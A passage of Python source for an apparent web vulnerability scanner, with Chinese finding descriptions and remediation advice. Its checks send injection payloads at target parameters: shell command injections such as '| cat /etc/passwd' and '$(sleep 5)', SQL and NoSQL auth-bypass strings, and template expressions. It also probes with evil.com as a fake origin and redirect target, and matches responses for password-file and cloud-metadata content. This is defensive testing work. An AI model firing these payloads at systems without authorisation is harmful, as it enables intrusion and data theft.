        """Test for Server Side Template Injection"""
        # First get baseline
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_text = baseline.text[:3000] if baseline.text else ''
        except Exception:
            return

        for param_name in list(params.keys())[:2]:
            if self._stop_flag:
                return

            # Quick check with {{7*7}}
            quick_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>']
            for payload in quick_payloads:
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if not resp:
                        continue
                    resp_text = resp.text[:3000] if resp.text else ''

                    # Check for computed results
                    if '49' in resp_text and '49' not in baseline_text:
                        engine = self.SSTI_MARKERS.get('49', '未知模板引擎')
                        results['vulnerabilities'].append({
                            'type': 'ssti',
                            'severity': 'critical',
                            'title': f'服务端模板注入 (参数: {param_name})',
                            'description': f'输入被直接传入模板引擎求值，可导致远程代码执行。检测到引擎: {engine}',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'{{7*7}} 被求值为 49（基线不含 49）',
                            'response_snippet': self._extract_context(resp_text, '49'),
                            'cvss': 9.8,
                            'remediation': '避免将用户输入传入模板渲染；使用沙箱模板环境；对输入进行严格白名单校验',
                        })
                        return
                    elif '7777777' in resp_text and '7777777' not in baseline_text:
                        results['vulnerabilities'].append({
                            'type': 'ssti',
                            'severity': 'critical',
                            'title': f'服务端模板注入 - Jinja2 (参数: {param_name})',
                            'description': '{{7*7}} 被拼接 7 次，确认为 Jinja2 模板引擎，可执行任意代码',
                            'url': url,
                            'parameter': param_name,
                            'payload': "{{7*'7'}}",
                            'evidence': "7*'7' 被求值为 7777777",
                            'cvss': 9.8,
                            'remediation': '禁止用户输入进入 Jinja2 模板上下文',
                        })
                        return
                except Exception:
                    pass

    # ── NoSQL Injection ──

    def _test_nosqli(self, url, params, results):
        """Test for NoSQL injection (MongoDB etc.)"""
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.text or '')
        except Exception:
            return

        for param_name in list(params.keys())[:2]:
            if self._stop_flag:
                return
            for payload in self.NOSQL_PAYLOADS:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    parsed = urlparse(url)
                    test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

                    resp = self.session.get(test_url, timeout=self.timeout)
                    resp_text = resp.text[:3000] if resp.text else ''

                    # NoSQL injection indicators
                    nosql_errors = ['MongoError', 'bson', 'BSONObj', 'mongoc', '$where',
                                    'mapreduce', 'MONGODB', 'mongo', 'NoSQL', 'CastError']
                    matched_err = next((e for e in nosql_errors if e.lower() in resp_text.lower()), None)

                    if matched_err:
                        results['vulnerabilities'].append({
                            'type': 'nosql_injection',
                            'severity': 'critical',
                            'title': f'NoSQL 注入漏洞 (参数: {param_name})',
                            'description': '输入被传入 NoSQL 查询，攻击者可绕过认证或读取任意数据',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'响应中出现 NoSQL 错误关键字: {matched_err}',
                            'cvss': 9.8,
                            'remediation': '验证输入类型，禁止操作符注入；使用类型检查的 ORM',
                        })
                        return

                    # Auth bypass: if $ne returns more data than baseline
                    if '$ne' in payload and resp.status_code == 200:
                        resp_len = len(resp.text or '')
                        if resp_len > baseline_len * 1.5 and baseline_status == 200:
                            results['vulnerabilities'].append({
                                'type': 'nosql_auth_bypass',
                                'severity': 'critical',
                                'title': f'NoSQL 认证绕过 (参数: {param_name})',
                                'description': '$ne 操作符绕过查询条件，返回了更多数据',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'基线 {baseline_len}B → 注入 {resp_len}B',
                                'cvss': 9.8,
                                'remediation': '禁用 $ne/$gt 等操作符处理用户输入',
                            })
                            return
                except Exception:
                    pass

    # ── Command Injection ──

    def _test_cmdi(self, url, params, results, evasion=None, waf_info=None):
        """Test for OS command injection"""
        for param_name in list(params.keys())[:2]:
            if self._stop_flag:
                return

            # Time-based detection (most reliable)
            time_payloads = ['$(sleep 5)', '`sleep 5`', '; sleep 5', '| sleep 5']
            for payload in time_payloads:
                try:
                    start_time = time.time()
                    resp = self._send_injected(url, params, param_name, payload, timeout=self.timeout + 8)
                    elapsed = time.time() - start_time

                    if resp and elapsed > 4.5:
                        results['vulnerabilities'].append({
                            'type': 'command_injection',
                            'severity': 'critical',
                            'title': f'命令注入漏洞 (参数: {param_name})',
                            'description': '用户输入被拼接为系统命令执行，攻击者可执行任意命令',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'延时 {elapsed:.1f}s 确认命令执行',
                            'cvss': 9.8,
                            'remediation': '避免调用系统命令；使用白名单参数；使用 shlex 转义',
                        })
                        return
                except Exception:
                    pass

            # Error-based detection
            error_payloads = ['; ls', '| cat /etc/passwd', '`whoami`', '$(whoami)']
            cmd_patterns = [
                (r'root:.*:0:0:', '/etc/passwd 泄露'),
                (r'bin:.*:/bin/', '系统用户信息泄露'),
                (r'(total \d+)', 'ls 命令输出'),
                (r'(uid=\d+.*gid=\d+)', 'id 命令输出'),
                (r'(\w+\\[\w]+)', 'Windows 用户信息'),
            ]
            for payload in error_payloads:
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if not resp:
                        continue
                    resp_text = resp.text[:3000] if resp.text else ''
                    for pattern, desc in cmd_patterns:
                        if re.search(pattern, resp_text):
                            results['vulnerabilities'].append({
                                'type': 'command_injection',
                                'severity': 'critical',
                                'title': f'命令注入漏洞 (参数: {param_name})',
                                'description': '用户输入被拼接为系统命令执行',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'命令输出泄露: {desc}',
                                'response_snippet': self._extract_context(resp_text, pattern),
                                'cvss': 9.8,
                                'remediation': '避免调用系统命令；使用参数化 API',
                            })
                            return
                except Exception:
                    pass

    # ── LFI / Path Traversal ──

    def _test_lfi(self, url, params, results):
        """Test for Local File Inclusion / Path Traversal"""
        # Get baseline
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_text = baseline.text[:2000] if baseline.text else ''
        except Exception:
            return

        for param_name in list(params.keys())[:2]:
            if self._stop_flag:
                return
            for payload in self.PATH_TRAVERSAL:
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if not resp:
                        continue
                    resp_text = resp.text[:5000] if resp.text else ''

                    for pattern in self.LFI_SIGNATURES:
                        if re.search(pattern, resp_text) and not re.search(pattern, baseline_text):
                            results['vulnerabilities'].append({
                                'type': 'lfi',
                                'severity': 'critical',
                                'title': f'本地文件包含 / 路径穿越 (参数: {param_name})',
                                'description': '可读取服务器上任意文件，可能泄露密码、密钥等敏感信息',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'响应匹配系统文件特征: {pattern}',
                                'response_snippet': self._extract_context(resp_text, pattern),
                                'cvss': 9.1,
                                'remediation': '禁止用户控制文件路径；使用白名单限制可访问文件；设置 chroot',
                            })
                            return
                except Exception:
                    pass

    # ── SSRF ──

    def _test_ssrf(self, url, params, results):
        """Test for Server Side Request Forgery"""
        # Get baseline
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.text or '')
        except Exception:
            return

        ssrf_params = [p for p in params if any(k in p.lower() for k in
                       ['url', 'uri', 'link', 'href', 'src', 'dest', 'target',
                        'path', 'file', 'page', 'site', 'host', 'address', 'redirect'])]

        for param_name in ssrf_params[:2]:
            if self._stop_flag:
                return
            for payload in self.SSRF_PAYLOADS[:6]:
                try:
                    resp = self._send_injected(url, params, param_name, payload)
                    if not resp:
                        continue
                    resp_text = resp.text[:3000] if resp.text else ''

                    # SSRF indicators
                    ssrf_indicators = [
                        ('root:.*:0:0:', '通过 SSRF 读取到 /etc/passwd'),
                        ('EC2', 'AWS 元数据'),
                        ('ami-id', 'AWS AMI ID'),
                        ('instance-id', 'AWS 实例 ID'),
                        ('computeMetadata', 'GCP 元数据'),
                        ('INTERNAL_SERVER_ERROR', '内部服务器错误'),
                        ('Connection refused', '连接被拒绝（目标可达）'),
                    ]

                    for pattern, desc in ssrf_indicators:
                        if re.search(pattern, resp_text, re.IGNORECASE):
                            results['vulnerabilities'].append({
                                'type': 'ssrf',
                                'severity': 'high',
                                'title': f'SSRF 漏洞 (参数: {param_name})',
                                'description': '服务端会请求用户指定的地址，可探测内网或访问云元数据',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': desc,
                                'cvss': 8.6,
                                'remediation': '禁止服务端请求内网地址；使用白名单限制目标域名；禁用 file://、gopher:// 等协议',
                            })
                            return
                except Exception:
                    pass

    # ── IDOR ──

    def _test_idor(self, url, results):
        """Test for Insecure Direct Object Reference"""
        parsed = urlparse(url)
        path = parsed.path

        id_matches = re.findall(r'/(\d{1,10})/?', path)
        if not id_matches:
            return

        original_id = id_matches[-1]
        test_ids = []
        try:
            oid = int(original_id)
            test_ids = [str(oid + 1), str(oid - 1), '1', '0']
        except ValueError:
            return

        try:
            resp_orig = self.session.get(url, timeout=self.timeout)
        except Exception:
            return

        for test_id in test_ids[:2]:
            if self._stop_flag:
                return
            try:
                test_path = path.replace(f'/{original_id}/', f'/{test_id}/', 1)
                if test_path == path:
                    test_path = path.replace(f'/{original_id}', f'/{test_id}', 1)
                qs = ('?' + parsed.query) if parsed.query else ''
                test_url = f'{parsed.scheme}://{parsed.netloc}{test_path}{qs}'

                resp_test = self.session.get(test_url, timeout=self.timeout)

                if (resp_test.status_code == 200
                    and resp_orig.status_code == 200
                    and len(resp_test.content) > 50
                    and abs(len(resp_test.content) - len(resp_orig.content)) < len(resp_orig.content) * 0.5):
                    results['vulnerabilities'].append({
                        'type': 'potential_idor',
                        'severity': 'high',
                        'title': '可能存在 IDOR 越权访问',
                        'description': f'替换 ID {original_id} → {test_id} 后仍返回有效数据，可能未校验资源归属',
                        'url': test_url,
                        'evidence': f'原始 {len(resp_orig.content)}B → 替换后 {len(resp_test.content)}B，均返回 200',
                        'cvss': 6.5,
                        'remediation': '在服务端校验当前用户是否有权访问该资源；使用不可预测的 UUID 替代自增 ID',
                    })
                    return
            except Exception:
                pass

    # ── Open Redirect ──

    def _test_open_redirect(self, url, params, results):
        """Test for open redirect vulnerabilities"""
        for param_name in params:
            if param_name.lower() not in self.REDIRECT_PARAMS:
                continue
            try:
                test_params = dict(params)
                test_params[param_name] = 'https://evil.com'
                parsed = urlparse(url)
                test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                location = resp.headers.get('Location', '')

                if resp.status_code in (301, 302, 307, 308) and 'evil.com' in location:
                    results['vulnerabilities'].append({
                        'type': 'open_redirect',
                        'severity': 'medium',
                        'title': f'开放重定向漏洞 (参数: {param_name})',
                        'description': '攻击者可构造恶意链接，将用户重定向到钓鱼网站',
                        'url': test_url,
                        'parameter': param_name,
                        'evidence': f'重定向到: {location}',
                        'cvss': 6.1,
                        'remediation': '禁止重定向到外部域名；使用白名单验证重定向目标',
                    })
                    return
            except Exception:
                pass

    # ── POST Injection ──

    def _test_post_injection(self, url, results, evasion=None, waf_info=None):
        """Test POST/PUT/PATCH endpoints for injection in JSON body"""
        try:
            # Send baseline POST
            baseline = self.session.post(url, json={}, timeout=self.timeout)
            baseline_text = baseline.text[:3000] if baseline.text else ''
        except Exception:
            return

        # Test JSON body injection
        json_payloads = [
            {"' OR '1'='1": "1"},
            {"username": "' OR '1'='1' --", "password": "x"},
            {"$gt": ""},
            {"$ne": ""},
            {"id": {"$gt": 0}},
        ]

        for payload in json_payloads:
            if self._stop_flag:
                return
            try:
                resp = self.session.post(url, json=payload, timeout=self.timeout)
                resp_text = resp.text[:3000] if resp.text else ''

                # SQL error in POST response
                matched = self._match_sqli_error(resp_text)
                if matched and not self._match_sqli_error(baseline_text):
                    results['vulnerabilities'].append({
                        'type': 'sql_injection_post',
                        'severity': 'critical',
                        'title': 'POST 请求体 SQL 注入',
                        'description': 'JSON body 中的输入未过滤，存在 SQL 注入',
                        'url': url,
                        'payload': json.dumps(payload),
                        'evidence': f'POST body 触发数据库报错: {matched}',
                        'cvss': 9.8,
                        'remediation': '对 JSON body 字段进行类型校验；使用参数化查询',
                    })
                    return
            except Exception:
                pass

    # ── CORS ──

    def _check_cors(self, url, results):
        """Check for CORS misconfiguration"""
        test_origins = ['https://evil.com', 'null', 'https://evil.com.evil.com']
        for origin in test_origins:
            try:
                resp = self.session.get(url, timeout=self.timeout, headers={'Origin': origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()

                if not acao:
                    continue

                if acao == origin and origin == 'https://evil.com' and acac == 'true':
                    results['vulnerabilities'].append({
                        'type': 'cors_misconfiguration',
                        'severity': 'high',
                        'title': 'CORS 配置错误：任意 Origin 反射 + Credentials',
                        'description': '服务器将任意来源反射回 ACAO 头并允许携带凭据，攻击者可窃取用户数据',
                        'url': url,
                        'evidence': f'Origin: {origin} → ACAO: {acao}, ACAC: {acac}',
                        'cvss': 8.1,
                        'remediation': '使用白名单限制允许的 Origin；不要同时设置 Origin=* 和 Credentials=true',
                    })
                    return
                elif acao == 'null':
                    results['vulnerabilities'].append({
                        'type': 'cors_null_origin',
                        'severity': 'medium',
                        'title': 'CORS 允许 null 来源',
                        'description': '允许 null origin 可被 sandboxed iframe 或 data URI 利用',
                        'url': url,
                        'evidence': f'ACAO: null',
                        'cvss': 5.3,
                        'remediation': '不要允许 null 作为合法 Origin',
                    })
                    return
                elif acao == '*' and acac == 'true':
                    results['vulnerabilities'].append({
                        'type': 'cors_wildcard_credentials',
                        'severity': 'high',
                        'title': 'CORS 通配符 + 凭据',
                        'description': 'Allow-Origin=* 配合 Allow-Credentials=true 是危险配置',
                        'url': url,
                        'evidence': f'ACAO: *, ACAC: true',
                        'cvss': 7.5,
                        'remediation': '指定具体的允许域名',
                    })
                    return
            except Exception:
                pass

    # ── HTTP Methods ──

    def _check_http_methods(self, url, results):
        """Check for dangerous HTTP methods"""
        try:
            resp = self.session.options(url, timeout=self.timeout)
            allow = resp.headers.get('Allow', '')
            if not allow:
                return

            methods = [m.strip().upper() for m in allow.split(',')]
            dangerous = [m for m in methods if m in ('PUT', 'DELETE', 'TRACE', 'CONNECT')]
            if dangerous:
                results['vulnerabilities'].append({
                    'type': 'dangerous_methods',
                    'severity': 'medium',
                    'title': f'允许危险 HTTP 方法: {", ".join(dangerous)}',
                    'description': '不必要的 HTTP 方法可能被攻击者利用',
                    'url': url,
                    'evidence': f'Allow: {allow}',
                    'cvss': 5.3,
                    'remediation': '在 Web 服务器配置中仅允许必要的 HTTP 方法',
                })

            if 'TRACE' in methods:
                results['vulnerabilities'].append({
                    'type': 'xst',
                    'severity': 'medium',
                    'title': 'TRACE 方法启用，存在 XST 攻击风险',
                    'description': 'TRACE 方法会回显请求内容，配合 XSS 可窃取 HttpOnly Cookie',
                    'url': url,
                    'evidence': f'Allow: {allow}',
                    'cvss': 5.3,
                    'remediation': '禁用 TRACE 方法',
                })
        except Exception:
            pass

    # ── CSRF ──

    def _check_csrf(self, endpoints, results):
        """Check for CSRF protection on state-changing endpoints"""
        post_endpoints = [ep for ep in endpoints
                          if isinstance(ep, dict) and ep.get('method', '').upper() in ('POST', 'PUT', 'DELETE', 'PATCH')]

        for ep in post_endpoints[:5]:
            if self._stop_flag:
                return
            url = ep.get('url', '')
            if not url:
                continue
            try:
                resp = self.session.get(url, timeout=self.timeout)
                resp_text = (resp.text or '')[:5000].lower()

                # Look for CSRF tokens
                csrf_indicators = ['csrf', '_token', 'authenticity_token',
                                   'csrfmiddlewaretoken', '__requestverificationtoken',
                                   '_csrf', 'xsrf', 'nonce']
                has_csrf = any(ind in resp_text for ind in csrf_indicators)

                # Check headers
                set_cookie = resp.headers.get('Set-Cookie', '').lower()
                has_samesite = 'samesite' in set_cookie

                if not has_csrf and not has_samesite:
                    results['vulnerabilities'].append({
                        'type': 'csrf',
                        'severity': 'medium',
                        'title': '可能存在 CSRF 漏洞',
                        'description': f'POST 端点未检测到 CSRF Token，Cookie 也未设置 SameSite 属性',
                        'url': url,
                        'evidence': '页面中未找到 csrf/token/xsrf 相关字段',
                        'cvss': 6.5,
                        'remediation': '添加 CSRF Token 验证；Cookie 设置 SameSite=Strict',
                    })
            except Exception:
                pass

    # ── Helpers ──

    def _send_injected(self, url, params, param_name, payload, timeout=None):
        """Send a request with one parameter injected"""
        test_params = dict(params)
        test_params[param_name] = payload
        parsed = urlparse(url)
        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
        return self.session.get(test_url, timeout=timeout or self.timeout)

    def _extract_context(self, text, pattern, chars=100):
        """Extract text around a regex match for evidence display"""
        m = re.search(pattern, text, re.IGNORECASE)
        if not m:
            return text[:chars]
        start = max(0, m.start() - 30)
        end = min(len(text), m.end() + 30)
        return text[start:end]

    def _cvss_sensitive(self, severity):
        """CVSS score for sensitive file findings"""
        return {'critical': 9.1, 'high': 7.5, 'medium': 5.3, 'low': 3.1}.get(severity, 3.1)

    def _cvss_header(self, severity):
        """CVSS score for header findings"""
        return {'critical': 9.0, 'high': 7.0, 'medium': 5.3, 'low': 3.1}.get(severity, 3.1)
